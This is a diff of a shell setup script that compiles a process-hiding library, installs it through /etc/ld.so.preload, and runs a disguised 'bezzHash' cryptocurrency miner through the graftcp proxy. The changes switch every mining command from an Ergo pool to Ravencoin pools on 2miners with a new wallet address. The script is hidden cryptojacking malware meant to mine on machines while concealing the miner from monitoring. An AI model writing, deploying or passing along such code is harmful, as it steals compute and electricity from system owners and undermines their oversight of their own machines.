@@ -1,4 +1,3 @@
-#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -43,18 +42,18 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX 
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX 
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@sg.ergo.herominers.com:1180 --ocX 
+./graftcp/graftcp ./bezzHash --url=RLHVhVtLPWRhdNXjXghE7f7dCoCYxkzKXZ.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX
